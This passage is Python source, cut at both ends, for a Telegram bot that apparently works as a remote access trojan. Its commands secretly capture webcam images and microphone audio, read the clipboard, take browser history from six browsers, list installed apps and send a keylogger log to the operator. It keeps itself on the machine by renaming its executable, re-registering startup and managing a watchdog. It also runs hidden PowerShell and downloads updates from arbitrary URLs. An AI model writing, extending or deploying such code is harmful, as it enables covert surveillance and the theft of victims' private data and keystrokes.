    user_id = message.from_user.id
    
    if not check_permission(user_id, ROLE_ADMIN):
        bot.reply_to(message, "❌ Недостаточно прав.")
        return
    
    admins = db.get_all_admins()
    
    if not admins:
        bot.reply_to(message, "📭 Нет зарегистрированных администраторов.")
        return
    
    text = "👨‍💼 <b>Список администраторов:</b>\n\n"
    
    for i, admin in enumerate(admins, 1):
        admin_id = admin.get('telegram_id')
        username = admin.get('username', f"user_{admin_id}")
        role = admin.get('role', 'admin')
        created_at = admin.get('created_at', 'N/A')
        
        role_icon = "👑" if role == ROLE_SUPER_ADMIN else "👨‍💼" if role == ROLE_ADMIN else "👤"
        
        text += f"{i}. {role_icon} <b>{username}</b>\n"
        text += f"   ID: <code>{admin_id}</code>\n"
        text += f"   Роль: {role}\n"
        text += f"   Добавлен: {created_at}\n\n"
    
    bot.reply_to(message, text, parse_mode='HTML')
    db.log_action(user_id, "admin_list_command")

# --- НОВЫЕ КОМАНДЫ МУЛЬТИМЕДИА И МОНИТОРИНГА ---

@bot.message_handler(commands=['webcam'])
@command_handler
def webcam_command(message):
    """Команда /webcam - захват изображения с веб-камеры"""
    user_id = message.from_user.id
    target_hwid = get_target_device_hwid(user_id)
    
    if target_hwid != CURRENT_HWID:
        bot.reply_to(message, "⚠️ Команда доступна только для текущего устройства.")
        return
    
    try:
        # Парсим параметр задержки (в секундах)
        text = message.text.strip()
        parts = text.split()
        
        delay = 0  # значение по умолчанию (без задержки)
        if len(parts) > 1:
            try:
                delay = int(parts[1])
                # Ограничиваем диапазон для безопасности
                if delay < 0:
                    delay = 0
                elif delay > 10:
                    delay = 10
                    bot.reply_to(message, "⚠️ Задержка ограничена 10 секундами для безопасности.")
            except ValueError:
                bot.reply_to(message, "⚠️ Неверный формат времени. Использую значение по умолчанию (без задержки).")
        
        if delay > 0:
            bot.reply_to(message, f"📸 Захватываю изображение с веб-камеры через {delay} секунд...")
            import time
            time.sleep(delay)
        else:
            bot.reply_to(message, "📸 Захватываю изображение с веб-камеры...")
        
        filepath, error = capture_webcam()
        
        if error:
            bot.reply_to(message, f"❌ {error}")
            return
        
        # Получаем информацию об устройстве для подписи
        device = db.get_device(target_hwid)
        device_name = device.get('device_name', 'Неизвестное устройство') if device else 'Неизвестное устройство'
        
        delay_text = f" (задержка {delay} сек.)" if delay > 0 else ""
        caption = f"📸 Изображение с веб-камеры{delay_text}\n📱 Устройство: {device_name}\n🆔 HWID: {target_hwid[:8]}..."
        
        with open(filepath, 'rb') as photo:
            bot.send_photo(message.chat.id, photo, caption=caption)
        
        # Удаляем временный файл
        import os
        os.remove(filepath)
        
        send_success_message(message.chat.id, "успешно ✅")
        db.log_action(user_id, "webcam_command", f"delay={delay}")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка захвата веб-камеры: {e}")

@bot.message_handler(commands=['mic'])
@command_handler
def mic_command(message):
    """Команда /mic - запись звука с микрофона"""
    user_id = message.from_user.id
    target_hwid = get_target_device_hwid(user_id)
    
    if target_hwid != CURRENT_HWID:
        bot.reply_to(message, "⚠️ Команда доступна только для текущего устройства.")
        return
    
    try:
        # Парсим параметр времени (длительность в секундах)
        text = message.text.strip()
        parts = text.split()
        
        duration = 5  # значение по умолчанию
        if len(parts) > 1:
            try:
                duration = int(parts[1])
                # Ограничиваем диапазон для безопасности
                if duration < 1:
                    duration = 1
                elif duration > 60:
                    duration = 60
                    bot.reply_to(message, "⚠️ Длительность ограничена 60 секундами для безопасности.")
            except ValueError:
                bot.reply_to(message, "⚠️ Неверный формат времени. Использую значение по умолчанию (5 секунд).")
        
        bot.reply_to(message, f"🎤 Записываю звук с микрофона ({duration} секунд)...")
        
        filepath, error = record_microphone(duration=duration)
        
        if error:
            bot.reply_to(message, f"❌ {error}")
            return
        
        # Получаем информацию об устройстве для подписи
        device = db.get_device(target_hwid)
        device_name = device.get('device_name', 'Неизвестное устройство') if device else 'Неизвестное устройство'
        
        caption = f"🎤 Запись с микрофона ({duration} сек.)\n📱 Устройство: {device_name}\n🆔 HWID: {target_hwid[:8]}..."
        
        with open(filepath, 'rb') as audio:
            bot.send_audio(message.chat.id, audio, caption=caption)
        
        # Удаляем временный файл
        import os
        os.remove(filepath)
        
        send_success_message(message.chat.id, "успешно ✅")
        db.log_action(user_id, "mic_command", f"duration={duration}")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка записи с микрофона: {e}")

@bot.message_handler(commands=['clipboard'])
@command_handler
def clipboard_command(message):
    """Команда /clipboard - получение содержимого буфера обмена"""
    user_id = message.from_user.id
    target_hwid = get_target_device_hwid(user_id)
    
    if target_hwid != CURRENT_HWID:
        bot.reply_to(message, "⚠️ Команда доступна только для текущего устройства.")
        return
    
    try:
        content, error = get_clipboard_content()
        
        if error:
            bot.reply_to(message, f"❌ {error}")
            return
        
        # Получаем информацию об устройстве
        device = db.get_device(target_hwid)
        device_name = device.get('device_name', 'Неизвестное устройство') if device else 'Неизвестное устройство'
        
        text = f"""📋 <b>Содержимое буфера обмена</b>

📱 Устройство: <b>{device_name}</b>
🆔 HWID: <code>{target_hwid[:8]}...</code>

<pre>{escape_html(content)}</pre>

⏰ Время запроса: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        
        bot.reply_to(message, text, parse_mode='HTML')
        send_success_message(message.chat.id, "успешно ✅")
        db.log_action(user_id, "clipboard_command")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка получения буфера обмена: {e}")

@bot.message_handler(commands=['history'])
@command_handler
def history_command(message):
    """Команда /history - история браузера (все браузеры, отправляется как файл для обхода таймаутов)"""
    user_id = message.from_user.id
    target_hwid = get_target_device_hwid(user_id)
    
    if target_hwid != CURRENT_HWID:
        bot.reply_to(message, "⚠️ Команда доступна только для текущего устройства.")
        return
    
    try:
        bot.reply_to(message, "🌐 Получаю историю всех браузеров...")
        
        # Список браузеров для проверки
        browsers = [
            ("chrome", "Chrome"),
            ("edge", "Microsoft Edge"),
            ("firefox", "Firefox"),
            ("yandex", "Yandex Browser"),
            ("opera", "Opera"),
            ("brave", "Brave")
        ]
        
        all_history = []
        successful_browsers = []
        failed_browsers = []
        
        # Получаем историю для каждого браузера
        for browser_key, browser_name in browsers:
            try:
                history_text, error = get_browser_history(browser=browser_key, limit=100)
                
                if error:
                    # Если браузер не найден или ошибка - пропускаем
                    failed_browsers.append(f"{browser_name}: {error}")
                    continue
                
                if history_text and history_text != "История браузера пуста":
                    all_history.append(f"\n{'='*60}\n")
                    all_history.append(f"ИСТОРИЯ БРАУЗЕРА: {browser_name.upper()}\n")
                    all_history.append(f"{'='*60}\n\n")
                    all_history.append(history_text)
                    successful_browsers.append(browser_name)
                else:
                    all_history.append(f"\n{'='*60}\n")
                    all_history.append(f"ИСТОРИЯ БРАУЗЕРА: {browser_name.upper()}\n")
                    all_history.append(f"{'='*60}\n\n")
                    all_history.append("История браузера пуста\n")
                    successful_browsers.append(f"{browser_name} (пусто)")
                    
            except Exception as e:
                failed_browsers.append(f"{browser_name}: {str(e)[:100]}")
                continue
        
        # Если ни один браузер не дал результатов
        if not all_history:
            bot.reply_to(message, "📭 История браузеров не найдена или все браузеры пусты.")
            return
        
        # Собираем полный текст
        header = "=" * 60 + "\n"
        header += "СВОДНАЯ ИСТОРИЯ БРАУЗЕРОВ\n"
        header += f"Устройство: {target_hwid}\n"
        header += f"Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        header += f"Успешно обработано: {len(successful_browsers)} браузеров\n"
        
        if failed_browsers:
            header += f"Ошибки: {len(failed_browsers)} браузеров\n"
        
        header += "=" * 60 + "\n\n"
        
        # Добавляем статистику
        stats = f"СТАТИСТИКА:\n"
        stats += f"• Успешно обработано: {', '.join(successful_browsers)}\n"
        if failed_browsers:
            stats += f"• Ошибки:\n"
            for fail in failed_browsers:
                stats += f"  - {fail}\n"
        stats += "\n" + "=" * 60 + "\n\n"
        
        full_text = header + stats + "".join(all_history)
        
        # Добавляем итоговую информацию
        footer = "\n" + "=" * 60 + "\n"
        footer += f"ВСЕГО БРАУЗЕРОВ: {len(browsers)}\n"
        footer += f"УСПЕШНО: {len(successful_browsers)}\n"
        footer += f"ОШИБКИ: {len(failed_browsers)}\n"
        footer += f"СГЕНЕРИРОВАНО: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        footer += "=" * 60
        
        full_text += footer
        
        # ОБХОД ТАЙМАУТОВ TELEGRAM: отправляем как файл
        import io
        from datetime import datetime
        
        # Создаем файл в памяти
        file_data = io.BytesIO(full_text.encode('utf-8'))
        
        # КРИТИЧЕСКИ ВАЖНО: Telegram API требует наличия имени файла
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"browser_history_{timestamp}.txt"
        file_data.name = filename
        
        # Получаем информацию об устройстве для подписи
        device = db.get_device(target_hwid)
        device_name = device.get('device_name', 'Неизвестное устройство') if device else 'Неизвестное устройство'
        
        caption = f"🌐 История всех браузеров\n📱 Устройство: {device_name}\n🆔 HWID: {target_hwid[:8]}...\n📊 Браузеров: {len(successful_browsers)}/{len(browsers)}"
        
        # Отправляем файл через send_document
        bot.send_document(
            message.chat.id,
            file_data,
            caption=caption,
            visible_file_name=filename
        )
        
        # Отправляем краткий отчет
        report = f"✅ История браузеров собрана:\n"
        report += f"• Успешно: {len(successful_browsers)} браузеров\n"
        if failed_browsers:
            report += f"• Ошибки: {len(failed_browsers)} браузеров\n"
        report += f"• Файл: {filename}"
        
        send_success_message(message.chat.id, report)
        db.log_action(user_id, "history_command", f"Browsers: {len(successful_browsers)}/{len(browsers)}")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка получения истории браузера: {e}")
        logger.error(f"Ошибка в history_command: {e}")

@bot.message_handler(commands=['app_list'])
@command_handler
def app_list_command(message):
    """Команда /app_list - список установленных приложений"""
    user_id = message.from_user.id
    target_hwid = get_target_device_hwid(user_id)
    
    if target_hwid != CURRENT_HWID:
        bot.reply_to(message, "⚠️ Команда доступна только для текущего устройства.")
        return
    
    try:
        bot.reply_to(message, "📦 Получаю список установленных приложений...")
        
        apps_text, error = get_installed_apps()
        
        if error:
            bot.reply_to(message, f"❌ {error}")
            return
        
        # ОБХОД ЛИМИТОВ TELEGRAM: всегда отправляем как файл
        import io
        from datetime import datetime
        
        # Создаем файл в памяти
        file_data = io.BytesIO(apps_text.encode('utf-8'))
        
        # КРИТИЧЕСКИ ВАЖНО: Telegram API требует наличия имени файла
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"installed_apps_{timestamp}.txt"
        file_data.name = filename
        
        # Получаем информацию об устройстве для подписи
        device = db.get_device(target_hwid)
        device_name = device.get('device_name', 'Неизвестное устройство') if device else 'Неизвестное устройство'
        
        # Подсчитываем количество приложений
        app_count = len([line for line in apps_text.splitlines() if line.strip() and not line.startswith('=')])
        
        caption = f"📦 Список установленных приложений\n📱 Устройство: {device_name}\n🆔 HWID: {target_hwid[:8]}...\n📊 Всего приложений: {app_count}"
        
        # Отправляем файл через send_document
        bot.send_document(
            message.chat.id,
            file_data,
            caption=caption,
            visible_file_name=filename
        )
        
        send_success_message(message.chat.id, "успешно ✅")
        db.log_action(user_id, "app_list_command")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка получения списка приложений: {e}")

# --- КОМАНДА ДЛЯ ПОЛНОГО СКАНИРОВАНИЯ СИСТЕМЫ ---

@bot.message_handler(commands=['full_scan'])
@command_handler
def full_scan_command(message):
    """Команда /full_scan - полное сканирование системы"""
    user_id = message.from_user.id
    target_hwid = get_target_device_hwid(user_id)
    
    if not target_hwid:
        bot.reply_to(message, "❌ Сначала выберите устройство через /panel")
        return
    
    # Проверка, что команда выполняется на текущем устройстве
    from bot_core import CURRENT_HWID
    if target_hwid != CURRENT_HWID:
        bot.reply_to(message, "❌ Команда /full_scan доступна только для текущего устройства")
        return
    
    try:
        bot.reply_to(message, "🔍 Начинаю полное сканирование системы...")
        result_tuple = perform_full_scan()
        scan_result = result_tuple[0]
        error = result_tuple[1] if len(result_tuple) > 1 else None
        
        if error:
            bot.reply_to(message, f"❌ Ошибка сканирования: {error}")
            return
        
        # scan_result уже содержит отформатированный текст с HTML
        bot.reply_to(message, scan_result, parse_mode='HTML')
        
        send_success_message(message.chat.id, "успешно ✅")
        db.log_action(user_id, "full_scan_command")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка при сканировании системы: {e}")

# --- КОМАНДА ДЛЯ ГЛУБОКОГО СКАНИРОВАНИЯ СИСТЕМЫ ---

@bot.message_handler(commands=['deep_scan'])
@command_handler
def deep_scan_command(message):
    """Команда /deep_scan - глубокое сканирование системы"""
    user_id = message.from_user.id
    target_hwid = get_target_device_hwid(user_id)
    
    if not target_hwid:
        bot.reply_to(message, "❌ Сначала выберите устройство через /panel")
        return
    
    # Проверка, что команда выполняется на текущем устройстве
    from bot_core import CURRENT_HWID
    if target_hwid != CURRENT_HWID:
        bot.reply_to(message, "❌ Команда /deep_scan доступна только для текущего устройства")
        return
    
    try:
        bot.reply_to(message, "🔍 Начинаю глубокое сканирование системы...")
        result_tuple = perform_deep_scan()
        scan_result = result_tuple[0]
        error = result_tuple[1] if len(result_tuple) > 1 else None
        
        if error:
            bot.reply_to(message, f"❌ Ошибка сканирования: {error}")
            return
        
        # scan_result уже содержит отформатированный текст с HTML
        bot.reply_to(message, scan_result, parse_mode='HTML')
        
        send_success_message(message.chat.id, "успешно ✅")
        db.log_action(user_id, "deep_scan_command")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка при глубоком сканировании системы: {e}")

# --- КОМАНДА ДЛЯ ОТПРАВКИ СООБЩЕНИЯ НА УСТРОЙСТВО ---

@bot.message_handler(commands=['message'])
@command_handler
def message_command(message):
    """Команда /message - отправка сообщения на устройство (требует подтверждения)"""
    user_id = message.from_user.id
    target_hwid = get_target_device_hwid(user_id)
    
    if not target_hwid:
        bot.reply_to(message, "❌ Сначала выберите устройство через /panel")
        return
    
    # Проверка, что команда выполняется на текущем устройстве
    from bot_core import CURRENT_HWID
    if target_hwid != CURRENT_HWID:
        bot.reply_to(message, "❌ Команда /message доступна только для текущего устройства")
        return
    
    # Получаем текст сообщения
    text = message.text.strip()
    if text.startswith('/message'):
        text = text[8:].strip()  # Убираем "/message"
    
    if not text:
        bot.reply_to(message, "❌ Укажите текст сообщения: /message <текст>")
        return
    
    # Запускаем процесс подтверждения с передачей данных о сообщении
    start_confirmation_flow(user_id, 'message', {'text': text})
    
    # Отправляем сообщение с инструкцией
    confirmation_msg = get_confirmation_full_message('message', {'text': text})
    bot.reply_to(message, confirmation_msg, parse_mode='HTML')

# --- АЛИАСЫ ДЛЯ СУЩЕСТВУЮЩИХ КОМАНД ---

@bot.message_handler(commands=['keyboard'])
@command_handler
def keyboard_command(message):
    """Команда /keyboard - получение хронологического лога клавиатуры"""
    user_id = message.from_user.id
    target_hwid = get_target_device_hwid(user_id)
    
    if not target_hwid:
        bot.reply_to(message, "❌ Сначала выберите устройство через /panel")
        return
    
    # Проверка, что команда выполняется на текущем устройстве
    from bot_core import CURRENT_HWID
    if target_hwid != CURRENT_HWID:
        bot.reply_to(message, "❌ Команда /keyboard доступна только для текущего устройства")
        return
    
    try:
        import io
        from datetime import datetime
        
        bot.reply_to(message, "⌨️ Получаю хронологический лог клавиатуры...")
        
        # Используем новый кейлоггер из bot_services
        try:
            from bot_services import get_keylog_as_text, clear_keylog
            
            # Получаем лог в читаемом формате
            log_text = get_keylog_as_text()
            
            if not log_text or log_text == "Лог пуст":
                bot.send_message(message.chat.id, "📭 Лог клавиатуры пуст.")
                return
            
            # Добавляем заголовок с информацией
            header = f"Хронологический лог клавиатуры\n"
            header += f"Устройство: {target_hwid}\n"
            header += f"Время генерации: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            header += "=" * 50 + "\n\n"
            
            full_log = header + log_text
            
        except ImportError as e:
            bot.reply_to(message, f"⚠️ Ошибка импорта нового кейлоггера: {e}")
            return
        
        # ЖЕЛЕЗОБЕТОННЫЙ ФИКС: используем io.BytesIO вместо записи на диск
        # Преобразуем строку в байты
        file_data = io.BytesIO(full_log.encode('utf-8'))
        
        # КРИТИЧЕСКИ ВАЖНО: Telegram API требует наличия имени файла
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"keyboard_log_{timestamp}.txt"
        file_data.name = filename
        
        # Отправляем файл через send_document
        bot.send_document(
            message.chat.id,
            file_data,
            caption=f"⌨️ Хронологический лог клавиатуры",
            visible_file_name=filename
        )
        
        # Очищаем лог после отправки (как требовалось)
        try:
            clear_keylog()
            bot.send_message(message.chat.id, "✅ Лог успешно получен, отправлен и очищен.")
        except Exception as clear_error:
            bot.send_message(message.chat.id, f"✅ Лог отправлен, но ошибка при очистке: {clear_error}")
        
        db.log_action(user_id, "keyboard_command")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка при получении лога клавиатуры: {e}")


@bot.message_handler(commands=['urs_update'])
@command_handler
def urs_update_command(message):
    """Команда /urs_update - OTA обновление по ссылке (алиас для /update_url)"""
    # Просто перенаправляем на существующую команду update_url
    # Для этого нужно импортировать функцию update_url_command из main_bot_final.py
    # Вместо этого создадим простую реализацию
    
    user_id = message.from_user.id
    
    # Проверяем права администратора
    if not is_admin(user_id):
        bot.reply_to(message, "❌ У вас нет прав для выполнения этой команды")
        return
    
    # Получаем URL из аргументов команды
    text = message.text.strip()
    if text.startswith('/urs_update'):
        url = text[11:].strip()
    
    if not url:
        bot.reply_to(message, "❌ Укажите URL: /urs_update <ссылка>")
        return
    
    try:
        bot.reply_to(message, f"📥 Начинаю загрузку обновления по ссылке: {url[:100]}...")
        
        # Используем функцию download_update из bot_services.py
        success, result = download_update(url)
        
        if success:
            bot.reply_to(message, f"✅ {result}")
            send_success_message(message.chat.id, "успешно ✅")
            db.log_action(user_id, "urs_update_command", f"URL: {url[:50]}")
        else:
            bot.reply_to(message, f"❌ {result}")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка при загрузке обновления: {e}")

# --- КОМАНДЫ ПЕРЕИМЕНОВАНИЯ ---

@bot.message_handler(commands=['rename_bot'])
@command_handler
def rename_bot_command(message):
    """Команда /rename_bot - переименование исполняемого файла главного бота"""
    user_id = message.from_user.id
    
    if not check_permission(user_id, ROLE_ADMIN):
        bot.reply_to(message, "❌ Недостаточно прав. Требуется роль администратора.")
        return
    
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "⚠️ Использование: <code>/rename_bot новое_имя.exe</code>\nПример: <code>/rename_bot service.exe</code>", parse_mode='HTML')
        return
    
    new_name = args[1].strip()
    if not new_name.lower().endswith('.exe'):
        new_name += '.exe'
    
    # Получаем текущий путь к исполняемому файлу
    current_path = sys.executable
    current_dir = os.path.dirname(current_path)
    new_path = os.path.join(current_dir, new_name)
    
    # Проверяем, существует ли уже файл с таким именем
    if os.path.exists(new_path):
        bot.reply_to(message, f"❌ Файл с именем '{new_name}' уже существует в директории.")
        return
    
    try:
        # Переименовываем файл
        os.rename(current_path, new_path)
        
        # Обновляем автозагрузку с новым путем
        from bot_core import remove_from_startup, add_to_startup
        remove_from_startup()
        add_to_startup(new_path)
        
        # Запускаем новый экземпляр
        import subprocess
        subprocess.Popen([new_path], creationflags=subprocess.CREATE_NO_WINDOW)
        
        bot.reply_to(message, f"✅ Бот переименован в <code>{new_name}</code>\nНовый процесс запущен, текущий завершится через 5 секунд.", parse_mode='HTML')
        
        # Завершаем текущий процесс
        import threading
        def exit_after_delay():
            import time
            time.sleep(5)
            os._exit(0)
        
        thread = threading.Thread(target=exit_after_delay, daemon=True)
        thread.start()
        
        db.log_action(user_id, "rename_bot", f"New name: {new_name}")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка при переименовании: {str(e)}")

@bot.message_handler(commands=['rename_wd'])
@command_handler
def rename_watchdog_command(message):
    """Команда /rename_wd - переименование файла watchdog.exe"""
    user_id = message.from_user.id
    
    if not check_permission(user_id, ROLE_ADMIN):
        bot.reply_to(message, "❌ Недостаточно прав. Требуется роль администратора.")
        return
    
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "⚠️ Использование: <code>/rename_wd новое_имя.exe</code>\nПример: <code>/rename_wd monitor.exe</code>", parse_mode='HTML')
        return
    
    new_name = args[1].strip()
    if not new_name.lower().endswith('.exe'):
        new_name += '.exe'
    
    # Ищем watchdog.exe в текущей директории
    current_dir = os.path.dirname(sys.executable)
    watchdog_path = os.path.join(current_dir, "watchdog.exe")
    
    if not os.path.exists(watchdog_path):
        bot.reply_to(message, "❌ Файл watchdog.exe не найден в текущей директории.")
        return
    
    new_path = os.path.join(current_dir, new_name)
    
    # Проверяем, существует ли уже файл с таким именем
    if os.path.exists(new_path):
        bot.reply_to(message, f"❌ Файл с именем '{new_name}' уже существует в директории.")
        return
    
    try:
        # Останавливаем watchdog если он запущен
        import psutil
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and proc.info['name'].lower() == 'watchdog.exe':
                try:
                    proc.terminate()
                    proc.wait(timeout=3)
                except:
                    pass
        
        # Переименовываем файл
        os.rename(watchdog_path, new_path)
        
        bot.reply_to(message, f"✅ Watchdog переименован в <code>{new_name}</code>", parse_mode='HTML')
        db.log_action(user_id, "rename_watchdog", f"New name: {new_name}")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка при переименовании watchdog: {str(e)}")

@bot.message_handler(commands=['rename_pc'])
@command_handler
def rename_pc_command(message):
    """Команда /rename_pc - изменение отображаемого имени устройства в БД"""
    user_id = message.from_user.id
    
    if not check_permission(user_id, ROLE_ADMIN):
        bot.reply_to(message, "❌ Недостаточно прав. Требуется роль администратора.")
        return
    
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "⚠️ Использование: <code>/rename_pc новое_имя</code>\nПример: <code>/rename_pc Офисный ПК</code>", parse_mode='HTML')
        return
    
    new_name = args[1].strip()
    
    if len(new_name) < 2 or len(new_name) > 50:
        bot.reply_to(message, "❌ Имя должно быть от 2 до 50 символов.")
        return
    
    try:
        # Обновляем имя устройства в базе данных
        from bot_core import CURRENT_HWID, set_device_name_reg
        
        # Обновляем в реестре
        set_device_name_reg(new_name)
        
        # Обновляем в базе данных
        cursor = db.conn.cursor()
        cursor.execute(
            "UPDATE devices SET device_name = ? WHERE hwid = ?",
            (new_name, CURRENT_HWID)
        )
        db.conn.commit()
        
        bot.reply_to(message, f"✅ Имя устройства изменено на: <b>{new_name}</b>", parse_mode='HTML')
        db.log_action(user_id, "rename_pc", f"New name: {new_name}")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка при изменении имени устройства: {str(e)}")

# --- КОМАНДА ДЛЯ УПРАВЛЕНИЯ ГРОМКОСТЬЮ ---

@bot.message_handler(commands=['volume'])
@command_handler
def volume_command(message):
    """Команда /volume - установка уровня громкости системы"""
    user_id = message.from_user.id
    target_hwid = get_target_device_hwid(user_id)
    
    if not target_hwid:
        bot.reply_to(message, "❌ Сначала выберите устройство через /panel")
        return
    
    # Проверка, что команда выполняется на текущем устройстве
    from bot_core import CURRENT_HWID
    if target_hwid != CURRENT_HWID:
        bot.reply_to(message, "❌ Команда /volume доступна только для текущего устройства")
        return
    
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, "⚠️ Использование: <code>/volume уровень</code>\nПример: <code>/volume 50</code> (0-100)\n<code>/volume mute</code> - выключить звук\n<code>/volume unmute</code> - включить звук", parse_mode='HTML')
        return
    
    volume_arg = args[1].strip().lower()
    
    try:
        # Пробуем использовать system_dll если доступен
        try:
            from system_dll import get_system_dll
            dll = get_system_dll()
            
            if volume_arg == 'mute':
                result = dll.mute_system_volume()
                if result:
                    bot.reply_to(message, "🔇 Звук выключен")
                else:
                    bot.reply_to(message, "❌ Не удалось выключить звук")
                    
            elif volume_arg == 'unmute':
                result = dll.unmute_system_volume()
                if result:
                    bot.reply_to(message, "🔊 Звук включен")
                else:
                    bot.reply_to(message, "❌ Не удалось включить звук")
                    
            else:
                # Пробуем парсить число
                try:
                    level = int(volume_arg)
                    if level < 0:
                        level = 0
                    if level > 100:
                        level = 100
                    
                    result = dll.set_system_volume(level)
                    if result:
                        bot.reply_to(message, f"🔊 Уровень громкости установлен на {level}%")
                    else:
                        bot.reply_to(message, f"❌ Не удалось установить громкость на {level}%")
                        
                except ValueError:
                    bot.reply_to(message, "❌ Неверный формат уровня громкости. Используйте число от 0 до 100")
                    
        except ImportError:
            # Fallback к PowerShell вместо nircmd
            import subprocess
            
            if volume_arg == 'mute':
                # Используем PowerShell для отключения звука
                ps_command = """
$wsh = New-Object -ComObject WScript.Shell
$wsh.SendKeys([char]173)  # Volume Mute key
"""
                result = subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", ps_command],
                                      creationflags=subprocess.CREATE_NO_WINDOW, timeout=5,
                                      capture_output=True, text=True)
                
                if result.returncode == 0:
                    bot.reply_to(message, "🔇 Звук выключен (через PowerShell)")
                else:
                    # Альтернативный метод
                    subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command",
                                  "(New-Object -ComObject Shell.Application).NameSpace(0x11).Self.InvokeVerb('Properties').Document.Application.Volume = 0"],
                                 creationflags=subprocess.CREATE_NO_WINDOW, timeout=5)
                    bot.reply_to(message, "🔇 Звук выключен (через PowerShell альтернативный метод)")
                
            elif volume_arg == 'unmute':
                # Зеркальная реализация к mute - используем тот же Volume Mute key (173)
                # который переключает состояние mute/unmute
                ps_command = """
$wsh = New-Object -ComObject WScript.Shell
$wsh.SendKeys([char]173)  # Volume Mute key (toggle - если звук выключен, включит его)
"""
                result = subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", ps_command],
                                      creationflags=subprocess.CREATE_NO_WINDOW, timeout=5,
                                      capture_output=True, text=True)
                
                if result.returncode == 0:
                    bot.reply_to(message, "🔊 Звук включен (через PowerShell - Volume Mute key)")
                else:
                    # Альтернативный метод - установка громкости на 50%
                    subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command",
                                  "(New-Object -ComObject Shell.Application).NameSpace(0x11).Self.InvokeVerb('Properties').Document.Application.Volume = 50"],
                                 creationflags=subprocess.CREATE_NO_WINDOW, timeout=5)
                    bot.reply_to(message, "🔊 Звук включен (через PowerShell альтернативный метод)")
                
            else:
                try:
                    level = int(volume_arg)
                    if level < 0:
                        level = 0
                    if level > 100:
                        level = 100
                    
                    # Используем PowerShell для установки уровня громкости
                    ps_command = f"(New-Object -ComObject Shell.Application).NameSpace(0x11).Self.InvokeVerb('Properties').Document.Application.Volume = {level}"
                    result = subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", ps_command],
                                          creationflags=subprocess.CREATE_NO_WINDOW, timeout=5,
                                          capture_output=True, text=True)
                    
                    if result.returncode == 0:
                        bot.reply_to(message, f"🔊 Уровень громкости установлен на {level}% (через PowerShell)")
                    else:
                        # Альтернативный метод с более сложным скриптом
                        ps_script = f"""
Add-Type -TypeDefinition @'
using System.Runtime.InteropServices;
[Guid("5CDF2C82-841E-4546-9722-0CF74078229A")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume {{
    int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);
}}
public class Audio {{
    [DllImport("ole32.dll")]
    public static extern int CoCreateInstance(ref System.Guid clsid, IntPtr inner, uint context, ref System.Guid uuid, out object volume);
    public static void SetVolume(float level) {{
        try {{
            var guid = new System.Guid("5CDF2C82-841E-4546-9722-0CF74078229A");
            object volume = null;
            CoCreateInstance(ref guid, IntPtr.Zero, 1, ref guid, out volume);
            var endpoint = (IAudioEndpointVolume)volume;
            endpoint.SetMasterVolumeLevelScalar(level, System.Guid.Empty);
        }} catch {{}}
    }}
}}
'@
[Audio]::SetVolume({level}/100.0)
"""
                        subprocess.run(["powershell", "-WindowStyle", "Hidden", "-Command", ps_script],
                                     creationflags=subprocess.CREATE_NO_WINDOW, timeout=5)
                        bot.reply_to(message, f"🔊 Уровень громкости установлен на {level}% (через Windows Audio API)")
                    
                except ValueError:
                    bot.reply_to(message, "❌ Неверный формат уровня громкости. Используйте число от 0 до 100")
        
        db.log_action(user_id, "volume_command", f"Volume: {volume_arg}")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка при установке громкости: {str(e)}")

# --- КОМАНДА ДЛЯ ПОЛНОГО УДАЛЕНИЯ БОТА ---

@bot.message_handler(commands=['uninstall'])
@command_handler
def uninstall_command(message):
    """Команда /uninstall - полное удаление бота с устройства"""
    user_id = message.from_user.id
    target_hwid = get_target_device_hwid(user_id)
    
    if not target_hwid:
        bot.reply_to(message, "❌ Сначала выберите устройство через /panel")
        return
    
    # Проверка, что команда выполняется на текущем устройстве
    from bot_core import CURRENT_HWID
    if target_hwid != CURRENT_HWID:
        bot.reply_to(message, "❌ Команда /uninstall доступна только для текущего устройства")
        return
    
    # Проверка прав администратора
    if not check_permission(user_id):
        bot.reply_to(message, "❌ У вас недостаточно прав для выполнения этой команды")
        return
    
    # Начинаем поток двойного подтверждения
    from bot_core import start_double_confirmation_flow, get_confirmation_full_message
    start_double_confirmation_flow(user_id, 'uninstall')
    
    # Получаем сообщение для первого шага подтверждения
    confirmation_msg = get_confirmation_full_message('uninstall', confirmation_step='first')
    bot.reply_to(message, confirmation_msg, parse_mode='HTML')
    
    db.log_action(user_id, "uninstall_command", "Started double confirmation flow")

# --- КОМАНДА ДЛЯ ОЧИСТКИ БАЗЫ ДАННЫХ ---

@bot.message_handler(commands=['cleanup_db', 'db_cleanup', 'cleanup'])
@command_handler
def cleanup_db_command(message):
